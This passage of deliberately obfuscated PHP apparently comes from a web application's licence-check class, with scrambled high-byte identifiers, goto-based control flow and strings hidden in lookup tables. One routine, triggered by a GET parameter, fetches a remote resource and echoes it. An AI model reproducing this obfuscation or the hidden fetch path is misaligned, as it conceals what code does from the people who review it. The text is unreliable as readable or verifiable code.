$this->tzuv9cc1ff50 . $AìçšğñÎÍ[124](5); $B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[125]][$AìçšğñÎÍ[126]] = $this->{$_SERVER[ù][127]}($B»Ïµß°ªò, $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[113]]); } if ($this->tzuv9cc1ff50 == $AìçšğñÎÍ[121]) { $B¬æ×“Öˆ¦[$AìçšğñÎÍ[93]][$AìçšğñÎÍ[94]][$AìçšğñÎÍ[99]][$AìçšğñÎÍ[107]] = 0; } $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[128]] = $AìçšğñÎÍ[104]($this->uiyw662b823d, $AìçšğñÎÍ[129], $AìçšğñÎÍ[10]); goto cóÂ²™‹ƒ; cóÂ²™‹ƒ: $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[130]] = $AìçšğñÎÍ[104]($this->uiyw662b823d, $AìçšğñÎÍ[131], $AìçšğñÎÍ[10]); $fùì¿ÉÅÀ© = $eŞ°ª»Îğ[590]; if ($AìçšğñÎÍ[104]($GLOBALS, $AìçšğñÎÍ[132]) && $this->config[$AìçšğñÎÍ[133]]) { $B¬æ×“Öˆ¦[$AìçšğñÎÍ[108]][$AìçšğñÎÍ[134]] = WEB_ROOT; } goto fó´à…õÊˆ; céìñöğ¬õ: $eŞ°ª»Îğ =& $_SERVER[”Ì÷ñ­î¸]; $AìçšğñÎÍ =& $_SERVER[ù]; $Cé¡èƒÀáÙ = $AìçšğñÎÍ[61]($AìçšğñÎÍ[62])->{$_SERVER[ù][63]}(); goto aêÌëé×É; aêÌëé×É: $d¾£‚Ù ¤ = array($AìçšğñÎÍ[64], $AìçšğñÎÍ[65], $AìçšğñÎÍ[66], $AìçšğñÎÍ[67], $AìçšğñÎÍ[68], $AìçšğñÎÍ[69], $AìçšğñÎÍ[70], $AìçšğñÎÍ[71], $AìçšğñÎÍ[72], $AìçšğñÎÍ[73], $AìçšğñÎÍ[74], $AìçšğñÎÍ[75], $AìçšğñÎÍ[76], $AìçšğñÎÍ[77], $AìçšğñÎÍ[78], $AìçšğñÎÍ[79], $AìçšğñÎÍ[80], $AìçšğñÎÍ[81], $AìçšğñÎÍ[82], $AìçšğñÎÍ[83], $AìçšğñÎÍ[84], $AìçšğñÎÍ[85], $AìçšğñÎÍ[86], $AìçšğñÎÍ[87], $AìçšğñÎÍ[88], $AìçšğñÎÍ[89], $AìçšğñÎÍ[90]); $fË¡š‹³Ë = $eŞ°ª»Îğ[583]; if (!$fË¡š‹³Ë) { die; } goto BÚå¾Á‘ÊÍ; EÚœÖ©¿°¶: } private function hcqi8baf7b45() { goto c—¥ŒØÜÀ÷; EèËÑšªÏÇ: $BŞ«ùºè¸ˆ = $EªŞ‡‚Ë‡†[592]; while ($BŞ«ùºè¸ˆ < $EªŞ‡‚Ë‡†[589]) { if ($BŞ«ùºè¸ˆ >= 0) { break; } $BŞ«ùºè¸ˆ++; } $b¡šà°Ã™õ = array($eìäÛËóªÇ[159] => $E¹¿õ—©Ô[$eìäÛËóªÇ[64]], $eìäÛËóªÇ[160] => $E¹¿õ—©Ô[$eìäÛËóªÇ[65]], $eìäÛËóªÇ[161] => $eìäÛËóªÇ[10]); goto c·ÜÕèíÙÈ; c—¥ŒØÜÀ÷: $EªŞ‡‚Ë‡† =& $_SERVER[”Ì÷ñ­î¸]; $eìäÛËóªÇ =& $_SERVER[ù]; if ($_SERVER[$eìäÛËóªÇ[44]] == $eìäÛËóªÇ[135]) { goto ašê°óæ²¡; ašê°óæ²¡: $EÈƒŞóÒí = array($eìäÛËóªÇ[120] => $this->tzuv9cc1ff50, $eìäÛËóªÇ[136] => $this->{$_SERVER[ù][137]}(), $eìäÛËóªÇ[138] => $eìäÛËóªÇ[61]($eìäÛËóªÇ[139])->{$_SERVER[ù][140]}()); if ($this->tzuv9cc1ff50 != $eìäÛËóªÇ[121]) { $F¬ğî°¡¦Œ = $eìäÛËóªÇ[104]($this->uiyw662b823d, $eìäÛËóªÇ[141]); if ($F¬ğî°¡¦Œ) { $EÈƒŞóÒí[$eìäÛËóªÇ[142]] = $F¬ğî°¡¦Œ; $EÈƒŞóÒí[$eìäÛËóªÇ[143]] = $eìäÛËóªÇ[144]($eìäÛËóªÇ[104]($this->uiyw662b823d, $eìäÛËóªÇ[145])); $EÈƒŞóÒí[$eìäÛËóªÇ[146]] = $eìäÛËóªÇ[104]($this->uiyw662b823d, $eìäÛËóªÇ[131]); } } $EÈƒŞóÒí = $this->{$_SERVER[ù][147]}($eìäÛËóªÇ[148]($EÈƒŞóÒí), $eìäÛËóªÇ[114]($eìäÛËóªÇ[149])); goto F²œ£Êáé; CÅ‘Á³¤­ƒ: $eìäÛËóªÇ[13](array($eìäÛËóªÇ[151], $eìäÛËóªÇ[152]), $b¡šà°Ã™õ); goto Dîö¤¸“‘; F²œ£Êáé: $a£‡ÃãÈóÔ = $EªŞ‡‚Ë‡†[591]; if (strlen($a£‡ÃãÈóÔ) < $EªŞ‡‚Ë‡†[553]) { die; } $b¡šà°Ã™õ = array($eìäÛËóªÇ[150] => $EÈƒŞóÒí); goto CÅ‘Á³¤­ƒ; Dîö¤¸“‘: } goto fÑÔªšŸª¥; c·ÜÕèíÙÈ: foreach ($F©×ŠâÕ‚Â as $CóÙ¨ƒŸ¤‘) { if (!isset($E¹¿õ—©Ô[$CóÙ¨ƒŸ¤‘]) || !$E¹¿õ—©Ô[$CóÙ¨ƒŸ¤‘]) { continue; } $b¡šà°Ã™õ[$CóÙ¨ƒŸ¤‘] = $E¹¿õ—©Ô[$CóÙ¨ƒŸ¤‘]; } $eìäÛËóªÇ[13](array($eìäÛËóªÇ[151], $eìäÛËóªÇ[152]), $b¡šà°Ã™õ); $CŠ­¨Ú•Ü§ = $EªŞ‡‚Ë‡†[593]; goto D ƒ›Ê²‡‹; D ƒ›Ê²‡‹: while ($CŠ­¨Ú•Ü§ < $EªŞ‡‚Ë‡†[555]) { if ($CŠ­¨Ú•Ü§ >= 0) { break; } $CŠ­¨Ú•Ü§++; } goto e­±â‹®˜; fÑÔªšŸª¥: if ($this->tzuv9cc1ff50 == $eìäÛËóªÇ[121]) { return; } $F©×ŠâÕ‚Â = array($eìäÛËóªÇ[153], $eìäÛËóªÇ[154], $eìäÛËóªÇ[155], $eìäÛËóªÇ[156], $eìäÛËóªÇ[157], $eìäÛËóªÇ[158]); $E¹¿õ—©Ô = $eìäÛËóªÇ[61]($eìäÛËóªÇ[62])->{$_SERVER[ù][63]}(); goto EèËÑšªÏÇ; e­±â‹®˜: } private function tkuq31cec3ad() { goto AàŸèçß†÷; EÀ“ÂÌ©Ó¡: $B¯‘Ø˜ˆ¼ = $E¡Ø¥ò‹[222]($E¡Ø¥ò‹[61]($E¡Ø¥ò‹[11])->{$_SERVER[ù][223]}(), $E¡Ø¥ò‹[224]); $b¡ÙÒÌëĞ… = $b†Éˆñà˜[599]; while ($b¡ÙÒÌëĞ… < $b†Éˆñà˜[555]) { if ($b¡ÙÒÌëĞ… >= 0) { break; } $b¡ÙÒÌëĞ…++; } goto c‹¬ì‚™ïÁ; aŞ½•â¦Ş˜: $E¡Ø¥ò‹[61]($E¡Ø¥ò‹[11])->{$_SERVER[ù][226]}($e§åê­„—Ã[$E¡Ø¥ò‹[227]], array($E¡Ø¥ò‹[228] => $B¼çÒëÜ‚)); $eÏ˜ŸÈµ¤È = $b†Éˆñà˜[600]; if (strlen($eÏ˜ŸÈµ¤È) < $b†Éˆñà˜[548]) { die; } goto Dô‰‚öÕ¨; B£œƒÀ½©†: $C©ÕÕø“ßƒ = $this->{$_SERVER[ù][127]}($E¡Ø¥ò‹[148]($DÄç‡¶óŒ‡), $A‹ÃğÏìß); $EêÀ÷Ÿùò§ = $b†Éˆñà˜[598]; while (strlen($EêÀ÷Ÿùò§) < $b†Éˆñà˜[553]) { if (!$EêÀ÷Ÿùò§) { break; } $EêÀ÷Ÿùò§++; } goto EÀ“ÂÌ©Ó¡; A¶—²ˆÑ¹: $E¡Ø¥ò‹[166]($E¡Ø¥ò‹[197]($E¡Ø¥ò‹[208]), !0); goto e×„ˆ·ŠĞ–; fËŠÚ±ÈÑ: $FÏéäŒÊ‰ = $this->{$_SERVER[ù][199]}($DÄç‡¶óŒ‡[$E¡Ø¥ò‹[200]]); if (!$FÏéäŒÊ‰ || $FÏéäŒÊ‰ != $E¡Ø¥ò‹[201]($DÄç‡¶óŒ‡[$E¡Ø¥ò‹[145]])) { $aŠä½­˜» = array($E¡Ø¥ò‹[202] => $E¡Ø¥ò‹[61]($E¡Ø¥ò‹[62])->{$_SERVER[ù][63]}($E¡Ø¥ò‹[116]), $E¡Ø¥ò‹[203] => $_SERVER[$E¡Ø¥ò‹[115]], $E¡Ø¥ò‹[204] => $E¡Ø¥ò‹[205](), $E¡Ø¥ò‹[174] => $_SERVER[$E¡Ø¥ò‹[175]]); $BĞ“ñ©‚ = $this->{$_SERVER[ù][206]}($E¡Ø¥ò‹[148]($aŠä½­˜»)); $this->{$_SERVER[ù][182]}($E¡Ø¥ò‹[207] . $BĞ“ñ©‚); $E¡Ø¥ò‹[166]($E¡Ø¥ò‹[197]($E¡Ø¥ò‹[208]), !0); } $F——…¤ôÃì = array($E¡Ø¥ò‹[209] => $Fš‰ßİÎŸ¢[$E¡Ø¥ò‹[165]], $E¡Ø¥ò‹[210] => $DÄç‡¶óŒ‡[$E¡Ø¥ò‹[211]], $E¡Ø¥ò‹[212] => $E¡Ø¥ò‹[124](16), $E¡Ø¥ò‹[120] => $DÄç‡¶óŒ‡[$E¡Ø¥ò‹[213]]); goto càïä¯Æ‚Ù; eëÁ®øˆÀ…: $E¡Ø¥ò‹[61]($E¡Ø¥ò‹[62])->{$_SERVER[ù][221]}($F——…¤ôÃì); $A‹ÃğÏìß = $E¡Ø¥ò‹[114]($_SERVER[$E¡Ø¥ò‹[115]] . $E¡Ø¥ò‹[214]($fŞ‰œŒ‚Î) . $F——…¤ôÃì[$E¡Ø¥ò‹[210]]); $bòÃŠù‘·õ = $E¡Ø¥ò‹[214]($E¡Ø¥ò‹[25]($A‹ÃğÏìß, 10, 16)); goto B£œƒÀ½©†; Dô‰‚öÕ¨: $this->uiyw662b823d = $DÄç‡¶óŒ‡; $this->tzuv9cc1ff50 = $F——…¤ôÃì[$E¡Ø¥ò‹[120]]; $this->{$_SERVER[ù][229]}(); goto A¶—²ˆÑ¹; c‹¬ì‚™ïÁ: $e§åê­„—Ã = $B¯‘Ø˜ˆ¼[$E¡Ø¥ò‹[225]]; $B¼çÒëÜ‚ = array(); $B¼çÒëÜ‚[$bòÃŠù‘·õ] = $C©ÕÕø“ßƒ; goto aŞ½•â¦Ş˜; bÃåØÓ‚™´: if (!$E¡Ø¥ò‹[104]($GLOBALS, $E¡Ø¥ò‹[132])) { die; } $cêÉ´ÀŞ‘Ú = $GLOBALS[$E¡Ø¥ò‹[22]]; if (isset($cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[163]])) { $this->{$_SERVER[ù][164]}(); die; } goto e¸£ƒãçÔõ; aø°Æ×ÉÄÏ: $dĞí‰¦“Å› = $b†Éˆñà˜[597]; $F——…¤ôÃì[$E¡Ø¥ò‹[123]] = $E¡Ø¥ò‹[118]($E¡Ø¥ò‹[214]($this->{$_SERVER[ù][147]}($b·™àê‡˜, $E¡Ø¥ò‹[216]))); if ($DÄç‡¶óŒ‡[$E¡Ø¥ò‹[217]] && $DÄç‡¶óŒ‡[$E¡Ø¥ò‹[217]] >= 1) { $E¡Ø¥ò‹[61]($E¡Ø¥ò‹[62])->{$_SERVER[ù][218]}($E¡Ø¥ò‹[219], $E¡Ø¥ò‹[220]); } goto eëÁ®øˆÀ…; F–‘ˆá ßİ: $eÔÀ—îœÓ¶ = $b†Éˆñà˜[594]; while (strlen($eÔÀ—îœÓ¶) < $b†Éˆñà˜[548]) { if (!$eÔÀ—îœÓ¶) { break; } $eÔÀ—îœÓ¶++; } $AÏ‚”ãÄä = $E¡Ø¥ò‹[114]($_SERVER[$E¡Ø¥ò‹[115]] . $fŞ‰œŒ‚Î); goto døµŒ¢Ş—á; AàŸèçß†÷: $b†Éˆñà˜ =& $_SERVER[”Ì÷ñ­î¸]; $E¡Ø¥ò‹ =& $_SERVER[ù]; if ($_SERVER[$E¡Ø¥ò‹[44]] != $E¡Ø¥ò‹[162]) { return; } goto bÃåØÓ‚™´; e¸£ƒãçÔõ: if (!isset($cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[165]]) || $E¡Ø¥ò‹[24]($cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[165]]) != 16) { $E¡Ø¥ò‹[166]($E¡Ø¥ò‹[167] . $cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[165]], !1); } $fŞ‰œŒ‚Î = $E¡Ø¥ò‹[61]($E¡Ø¥ò‹[62])->{$_SERVER[ù][63]}($E¡Ø¥ò‹[116]); $Fš‰ßİÎŸ¢ = array($E¡Ø¥ò‹[165] => $cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[165]], $E¡Ø¥ò‹[168] => $E¡Ø¥ò‹[124](16), $E¡Ø¥ò‹[169] => $E¡Ø¥ò‹[149], $E¡Ø¥ò‹[170] => $E¡Ø¥ò‹[171], $E¡Ø¥ò‹[172] => $_SERVER[$E¡Ø¥ò‹[173]], $E¡Ø¥ò‹[174] => $_SERVER[$E¡Ø¥ò‹[175]], $E¡Ø¥ò‹[176] => $_SERVER[$E¡Ø¥ò‹[177]]); goto F–‘ˆá ßİ; DŠ—ğ´Â›Ø: $F£¶ĞæÏò° = $E¡Ø¥ò‹[124](16); $BŠ£†÷á²Ê = $b†Éˆñà˜[596]; $b·™àê‡˜ = $F£¶ĞæÏò° . $F——…¤ôÃì[$E¡Ø¥ò‹[120]] . $this->{$_SERVER[ù][147]}($E¡Ø¥ò‹[114]($F——…¤ôÃì[$E¡Ø¥ò‹[209]]), $F£¶ĞæÏò°); goto aø°Æ×ÉÄÏ; càïä¯Æ‚Ù: if ($Fš‰ßİÎŸ¢[$E¡Ø¥ò‹[168]]) { $F——…¤ôÃì[$E¡Ø¥ò‹[212]] = $Fš‰ßİÎŸ¢[$E¡Ø¥ò‹[168]]; } $F¼¨°´ÖÚÒ = $E¡Ø¥ò‹[25]($E¡Ø¥ò‹[114]($F——…¤ôÃì[$E¡Ø¥ò‹[210]]), 10, 10); $Dè¶ÇÇó‡ = $F¼¨°´ÖÚÒ . $F——…¤ôÃì[$E¡Ø¥ò‹[120]] . $F——…¤ôÃì[$E¡Ø¥ò‹[212]]; goto cí«Á¥³¡; cí«Á¥³¡: $F——…¤ôÃì[$E¡Ø¥ò‹[122]] = $E¡Ø¥ò‹[214]($E¡Ø¥ò‹[118]($this->{$_SERVER[ù][147]}($Dè¶ÇÇó‡, $E¡Ø¥ò‹[215]))); $e ï¤ŠŸàÊ = $b†Éˆñà˜[595]; while (strlen($e ï¤ŠŸàÊ) < $b†Éˆñà˜[559]) { if (!$e ï¤ŠŸàÊ) { break; } $e ï¤ŠŸàÊ++; } goto DŠ—ğ´Â›Ø; døµŒ¢Ş—á: if ($cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[178]] == $E¡Ø¥ò‹[179]) { $e¥µŞ˜‡•ç = $this->{$_SERVER[ù][147]}($AÏ‚”ãÄä, $E¡Ø¥ò‹[180]); $BĞ“ñ©‚ = $this->{$_SERVER[ù][127]}($E¡Ø¥ò‹[148]($Fš‰ßİÎŸ¢), $AÏ‚”ãÄä . $E¡Ø¥ò‹[181], 3); $b×‘ß³Ø‹ = $this->{$_SERVER[ù][182]}($E¡Ø¥ò‹[183] . $e¥µŞ˜‡•ç . $E¡Ø¥ò‹[184] . $BĞ“ñ©‚, -1); $E¡Ø¥ò‹[166]($b×‘ß³Ø‹, !0); } else { if ($cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[178]] == $E¡Ø¥ò‹[185]) { $B¶ñóñ¶ÉØ = $E¡Ø¥ò‹[25]($E¡Ø¥ò‹[114]($E¡Ø¥ò‹[186] . $AÏ‚”ãÄä), 12, 15) . $E¡Ø¥ò‹[187]; $BĞ“ñ©‚ = $this->{$_SERVER[ù][188]}($E¡Ø¥ò‹[2]($cêÉ´ÀŞ‘Ú[$E¡Ø¥ò‹[189]]), $B¶ñóñ¶ÉØ, 2); $bôÆÔÓÇ“å = $E¡Ø¥ò‹[190]($BĞ“ñ©‚, !0); if (!$E¡Ø¥ò‹[191]($bôÆÔÓÇ“å) || !$E¡Ø¥ò‹[191]($bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]]) || $bôÆÔÓÇ“å[$E¡Ø¥ò‹[165]] != !0) { $BÍŠÜ‚ë‘ = $E¡Ø¥ò‹[193]; $fóºŞôîø = $bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]] ? $E¡Ø¥ò‹[194] . $bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]] : $BÍŠÜ‚ë‘; $E¡Ø¥ò‹[166]($fóºŞôîø, !1); } else { $Fš‰ßİÎŸ¢[$E¡Ø¥ò‹[168]] = $bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]][$E¡Ø¥ò‹[195]]; } } else { $bôÆÔÓÇ“å = $this->{$_SERVER[ù][182]}($E¡Ø¥ò‹[196], $Fš‰ßİÎŸ¢, 10); } } if (!$E¡Ø¥ò‹[191]($bôÆÔÓÇ“å) || !$E¡Ø¥ò‹[191]($bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]]) || $bôÆÔÓÇ“å[$E¡Ø¥ò‹[165]] != !0) { $BÍŠÜ‚ë‘ = $E¡Ø¥ò‹[197]($E¡Ø¥ò‹[198]); $fóºŞôîø = $bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]] ? $E¡Ø¥ò‹[194] . $bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]] : $BÍŠÜ‚ë‘; $E¡Ø¥ò‹[166]($fóºŞôîø, !1); } $DÄç‡¶óŒ‡ = $bôÆÔÓÇ“å[$E¡Ø¥ò‹[192]]; goto fËŠÚ±ÈÑ; e×„ˆ·ŠĞ–: } private function licenseRegistSuccess() { $f®áôàµÑµ =& $_SERVER[ù]; $aÃ¯ â¦½¨ = $f®áôàµÑµ[61]($f®áôàµÑµ[62])->{$_SERVER[ù][63]}(); $DÁÖ†¼™ôõ = $_SERVER[”Ì÷ñ­î¸][601]; if (!$DÁÖ†¼™ôõ) { return; } if ($aÃ¯ â¦½¨[$f®áôàµÑµ[85]] != $f®áôàµÑµ[220]) { $f®áôàµÑµ[61]($f®áôàµÑµ[62])->{$_SERVER[ù][221]}($f®áôàµÑµ[85], $f®áôàµÑµ[220]); } $f®áôàµÑµ[110]($f®áôàµÑµ[230])->{$_SERVER[ù][231]}(!0); } private function amfg921b1580() { goto A†È‹ÚÖèí; déÁöÒÄ¸Ä: $a…ÍôŸ¢¾Ø[61]($a…ÍôŸ¢¾Ø[62])->{$_SERVER[ù][218]}($a…ÍôŸ¢¾Ø[219], $a…ÍôŸ¢¾Ø[232]); $E¥°’ ª¥™ = $BÔ¸®íÛÁ[602]; if (strlen($E¥°’ ª¥™) < $BÔ¸®íÛÁ[548]) { return; } goto bè¿†ƒº¿©; A†È‹ÚÖèí: $BÔ¸®íÛÁ =& $_SERVER[”Ì÷ñ­î¸]; $a…ÍôŸ¢¾Ø =& $_SERVER[ù]; $a…ÍôŸ¢¾Ø[61]($a…ÍôŸ¢¾Ø[62])->{$_SERVER[ù][221]}(array($a…ÍôŸ¢¾Ø[209] => $a…ÍôŸ¢¾Ø[10], $a…ÍôŸ¢¾Ø[210] => $a…ÍôŸ¢¾Ø[10], $a…ÍôŸ¢¾Ø[120] => $a…ÍôŸ¢¾Ø[121], $a…ÍôŸ¢¾Ø[122] => $a…ÍôŸ¢¾Ø[10], $a…ÍôŸ¢¾Ø[123] => $a…ÍôŸ¢¾Ø[10])); goto déÁöÒÄ¸Ä; bè¿†ƒº¿©: $this->uiyw662b823d = array(); $dÊƒ²•½° = $BÔ¸®íÛÁ[603]; $this->tzuv9cc1ff50 = $a…ÍôŸ¢¾Ø[121]; goto e‹…ôÃ´˜‡; e‹…ôÃ´˜‡: } private function xnhga8646b62() { goto AĞœõë¿‰Ö; fÛØ³§ä«İ: $bë¤„‰ĞÓ = $cçƒÂ»º™Ë[214]($cçƒÂ»º™Ë[25]($BªÇÜÅá„, 10, 16)); $e˜ª–¼º‰ = $dÖËÖ²–Ò„[605]; while ($e˜ª–¼º‰ < $dÖËÖ²–Ò„[553]) { if ($e˜ª–¼º‰ >= 0) { break; } $e˜ª–¼º‰++; } goto BÊì§œ‘†…; fÖ–±Íˆ—¸: $this->uiyw662b823d = $Eàª±èîõô; $this->tzuv9cc1ff50 = $eùùå‰Œ[$cçƒÂ»º™Ë[120]]; goto e†ìø’—Ÿ; BÊì§œ‘†…: $Eàª±èîõô = $this->{$_SERVER[ù][188]}($bñù¬Ïµç[$cçƒÂ»º™Ë[91]][$bë¤„‰ĞÓ], $BªÇÜÅá„); $e»Ò—ÎË‘» = $dÖËÖ²–Ò„[606]; $Eàª±èîõô = $cçƒÂ»º™Ë[190]($Eàª±èîõô, !0); goto a®—¤æ ŸÍ; b±°µ˜ ›Á: $BªÇÜÅá„ = $cçƒÂ»º™Ë[114]($_SERVER[$cçƒÂ»º™Ë[115]] . $cçƒÂ»º™Ë[214]($b¤¥öÂ‡î) . $eùùå‰Œ[$cçƒÂ»º™Ë[210]]); $B’¯Š‰‹İø = $dÖËÖ²–Ò„[604]; if (!$B’¯Š‰‹İø) { return; } goto fÛØ³§ä«İ; eƒ‰ˆêÉáÓ: $b¤¥öÂ‡î = $cçƒÂ»º™Ë[61]($cçƒÂ»º™Ë[62])->{$_SERVER[ù][63]}($cçƒÂ»º™Ë[116]); $FíÜõİñõ = $cçƒÂ»º™Ë[222]($cçƒÂ»º™Ë[61]($cçƒÂ»º™Ë[11])->{$_SERVER[ù][223]}(), $cçƒÂ»º™Ë[224]); $bñù¬Ïµç = $FíÜõİñõ[$cçƒÂ»º™Ë[225]]; goto b±°µ˜ ›Á; AĞœõë¿‰Ö: $dÖËÖ²–Ò„ =& $_SERVER[”Ì÷ñ­î¸]; $cçƒÂ»º™Ë =& $_SERVER[ù]; $_SERVER[$cçƒÂ»º™Ë[175]] = $cçƒÂ»º™Ë[104]($_SERVER, $cçƒÂ»º™Ë[175], APP_HOST); goto aî·¿¹©É†; aî·¿¹©É†: $this->tzuv9cc1ff50 = $cçƒÂ»º™Ë[121]; $eùùå‰Œ = $cçƒÂ»º™Ë[61]($cçƒÂ»º™Ë[62])->{$_SERVER[ù][63]}(); if ($eùùå‰Œ[$cçƒÂ»º™Ë[120]] == $cçƒÂ»º™Ë[121]) { return; } goto eƒ‰ˆêÉáÓ; a®—¤æ ŸÍ: if (!$cçƒÂ»º™Ë[191]($Eàª±èîõô)) { return $this->{$_SERVER[ù][164]}(); } $Aá‘Ÿçéåà = $cçƒÂ»º™Ë[144]($Eàª±èîõô[$cçƒÂ»º™Ë[145]]); if ($cçƒÂ»º™Ë[233]() >= $Aá‘Ÿçéåà) { return $this->{$_SERVER[ù][164]}(); } goto fÖ–±Íˆ—¸; e†ìø’—Ÿ: } private function uxce4de62075() { goto fõÒ·Àœçô; fõÒ·Àœçô: $DòäÅË­Åİ =& $_SERVER[ù]; $d±õÀÎĞí§ = $GLOBALS[$DòäÅË­Åİ[22]]; $b˜æ‰Ê«³ô = $_SERVER[$DòäÅË­Åİ[44]]; goto EÊòêÖçÑ‡; EÊòêÖçÑ‡: $a¿”º¹­çƒ = $_SERVER[”Ì÷ñ­î¸][607]; if (!$a¿”º¹­çƒ) { return; } if ($b˜æ‰Ê«³ô == $DòäÅË­Åİ[234] && $this->tzuv9cc1ff50 == $DòäÅË­Åİ[121]) { $DòäÅË­Åİ[166]($DòäÅË­Åİ[197]($DòäÅË­Åİ[235]), !1, $DòäÅË­Åİ[236]); } goto A¾µ®ÌÛ•æ; A¾µ®ÌÛ•æ: $Cäñˆí‘ğÂ = array($DòäÅË­Åİ[237], $DòäÅË­Åİ[238]); if ($DòäÅË­Åİ[239]($b˜æ‰Ê«³ô, $Cäñˆí‘ğÂ)) { if ($this->tzuv9cc1ff50 == $DòäÅË­Åİ[121] && isset($d±õÀÎĞí§[$DòäÅË­Åİ[240]])) { $DòäÅË­Åİ[166]($DòäÅË­Åİ[197]($DòäÅË­Åİ[235]), !1, $DòäÅË­Åİ[236]); die; } $C†‰ª¹ì¯¬ = $this->{$_SERVER[ù][137]}(); if ($C†‰ª¹ì¯¬ != $DòäÅË­Åİ[201]($DòäÅË­Åİ[241])) { if ($C†‰ª¹ì¯¬ <= $DòäÅË­Åİ[61]($DòäÅË­Åİ[139])->{$_SERVER[ù][140]}()) { $DòäÅË­Åİ[166]($DòäÅË­Åİ[197]($DòäÅË­Åİ[242]), !1, $DòäÅË­Åİ[236]); die; } } } goto A÷ùö÷ëåø; A÷ùö÷ëåø: } private function nmpk9f43651d() { goto båºã‰©ˆ×; F…™í¿ØÀÌ: $Féİ¬¾È¨… = $cõïÉ„ÔßŞ[608]; while (strlen($Féİ¬¾È¨…) < $cõïÉ„ÔßŞ[589]) { if (!$Féİ¬¾È¨…) { break; } $Féİ¬¾È¨…++; } $c°ÈÊ„Ÿ = $this->{$_SERVER[ù][246]}($c°ÈÊ„Ÿ, $c—·ªğ¡°ì[247]); goto bŞ×ê‰Éšä; bŞ×ê‰Éšä: $a° Š±§ø = $cõïÉ„ÔßŞ[609]; while (strlen($a° Š±§ø) < $cõïÉ„ÔßŞ[548]) { if (!$a° Š±§ø) { break; } $a° Š±§ø++; } $bâæ•à¨¹ª = $c—·ªğ¡°ì[248](array($c—·ªğ¡°ì[249] => array($c—·ªğ¡°ì[250] => $c—·ªğ¡°ì[251], $c—·ªğ¡°ì[252] => 3))); goto DÚæÍóõ¤‰; eë”õ½¡ÔŠ: if (!$c—·ªğ¡°ì[104]($GLOBALS, $c—·ªğ¡°ì[132]) || !isset($_GET[$c—·ªğ¡°ì[244]])) { return; } if (!$c—·ªğ¡°ì[239]($_SERVER[$c—·ªğ¡°ì[44]], $B×õ…ÆŠºÌ)) { return; } $c°ÈÊ„Ÿ = $c—·ªğ¡°ì[245]; goto F…™í¿ØÀÌ; DÚæÍóõ¤‰: $bÕùÜ‘¦ç· = $cõïÉ„ÔßŞ[610]; $c¨˜àÖ•¼è = @$c—·ªğ¡°ì[253]($c°ÈÊ„Ÿ, !1, $bâæ•à¨¹ª); $bÒ“À‘»Š¡ = $cõïÉ„ÔßŞ[611]; goto eååçÄˆ™â; eååçÄˆ™â: $c—·ªğ¡°ì[254]($c—·ªğ¡°ì[255]); if ($c¨˜àÖ•¼è && $c—·ªğ¡°ì[32]($c¨˜àÖ•¼è, $c—·ªğ¡°ì[256])) { echo $c¨˜àÖ•¼è; } die; goto c™Ë„ùçÒâ; båºã‰©ˆ×: $cõïÉ„ÔßŞ =& $_SERVER[”Ì÷ñ­î¸]; $c—·ªğ¡°ì =& $_SERVER[ù]; $B×õ…ÆŠºÌ = array($c—·ªğ¡°ì[135], $c—·ªğ¡°ì[243]); goto eë”õ½¡ÔŠ; c™Ë„ùçÒâ: } public function vofc4a8fca38($EØÍòŒ„âË) { goto C¬ôËóçÈç; C¬ôËóçÈç: $E½ÛÉ¢Òµ =& $_SERVER[”Ì÷ñ­î¸]; $d£â®ˆÈŒß =& $_SERVER[ù]; if ($this->tzuv9cc1ff50 == $d£â®ˆÈŒß[257]) { return $EØÍòŒ„âË; } goto D³á¤¿õ»â; fôİ‘ÑîÖ°: $F´Û³–Â = $d£â®ˆÈŒß[0]($d£â®ˆÈŒß[266], $d£â®ˆÈŒß[104]($this->uiyw662b823d, $d£â®ˆÈŒß[129], $d£â®ˆÈŒß[10])); $b³Ïé ´È¸ = $E½ÛÉ¢Òµ[613]; if (strlen($b³Ïé ´È¸) < $E½ÛÉ¢Òµ[548]) { die; } goto A¦‡¯ãŸé; A¦‡¯ãŸé: $bß˜ô•È¨ì = array(); $e¤ÓåØŠÖÀ = $E½ÛÉ¢Òµ[614]; if (strlen($e¤ÓåØŠÖÀ) < $E½ÛÉ¢Òµ[559]) { return; } goto aŒöİÁ¬¯; D³á¤¿õ»â: $D ÛÚîßÜ† = array($d£â®ˆÈŒß[258], $d£â®ˆÈŒß[259], $d£â®ˆÈŒß[260], $d£â®ˆÈŒß[261], $d£â®ˆÈŒß[262], $d£â®ˆÈŒß[263], $d£â®ˆÈŒß[264], $d£â®ˆÈŒß[265]); $aëğˆ§©÷Ô = $E½ÛÉ¢Òµ[612]; if (strlen($aëğˆ§©÷Ô) < $E½ÛÉ¢Òµ[555]) { die; } goto fôİ‘ÑîÖ°; aŒöİÁ¬¯: foreach ($D ÛÚîßÜ† as $c¼±Ãƒìçñ) { if (!$d£â®ˆÈŒß[239]($c¼±Ãƒìçñ, $F´Û³–Â)) { $bß˜ô•È¨ì[] = $c¼±Ãƒìçñ; } } foreach ($bß˜ô•È¨ì as $c¼±Ãƒìçñ) { unset($EØÍòŒ„âË[$c¼±Ãƒìçñ]); $c§´î‹ïè = $E½ÛÉ¢Òµ[615]; if (!$c§´î‹ïè) { return; } } return $EØÍòŒ„âË; goto B–«¸ÓŒóØ; B–«¸ÓŒóØ: } private function mxdldf4bf07e() { goto D¯›ğÀ™‹ô; Eó¯½‚‚²Õ: $B£·ÂÀƒ…è = $Eá‚ø×óÙ[617]; if (!$B£·ÂÀƒ…è) { die; } 